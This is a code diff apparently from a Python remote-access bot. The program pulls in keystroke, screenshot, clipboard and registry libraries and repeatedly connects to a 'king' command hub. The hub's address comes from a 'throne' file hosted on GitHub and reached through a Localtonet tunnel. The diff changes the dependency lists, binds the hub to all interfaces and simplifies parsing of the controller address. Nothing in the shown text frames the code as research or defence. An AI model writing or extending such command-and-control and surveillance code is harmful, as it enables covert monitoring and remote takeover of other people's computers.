@@ -20,7 +20,7 @@ import winreg
 from urllib.parse import urlparse
 
 def install_dependencies():
-    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client', 'pywin32']
+    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
     for lib in required:
         try:
             __import__(lib if lib != 'pycryptodome' else 'Crypto')
@@ -88,12 +88,12 @@ except ImportError:
     psutil = None
     PSUTIL_AVAILABLE = False
 
-REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip', 'pywin32']
+REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
 
 # Default command hub settings. These values can be overridden by
 # environment variables KING_HUB_IP / KING_HUB_PORT or by passing
 # --hub-ip / --hub-port on the command line.
-HUB_ADDRESS = '127.0.0.1'
+HUB_ADDRESS = '0.0.0.0'
 HUB_PORT = 9999
 DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'
 
@@ -1023,23 +1023,15 @@ def connect_to_king(king_url):
     """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
     while True:
         try:
-            if not king_url:
-                raise ValueError("Empty throne address")
+            address = king_url.strip()
+            if not address or ':' not in address:
+                raise ValueError("Invalid throne address format")
 
-            destination = str(king_url).strip()
-            parsed_host, parsed_port = _parse_king_destination(destination)
-
-            if parsed_host and parsed_port:
-                host = parsed_host
-                port = str(parsed_port)
-            else:
-                if ':' not in destination:
-                    raise ValueError("Invalid throne address format")
-                host, port = destination.split(':', 1)
-                host = host.strip()
-                port = port.strip()
-                if not host or not port.isdigit():
-                    raise ValueError("Invalid throne host or port")
+            host, port = address.split(':', 1)
+            host = host.strip()
+            port = port.strip()
+            if not host or not port.isdigit():
+                raise ValueError("Invalid throne host or port")
 
             print(f"[*] Localtonet destination from throne: {host}:{port}")
             print(f"[*] Connecting directly to Localtonet TCP: {host}:{port}")
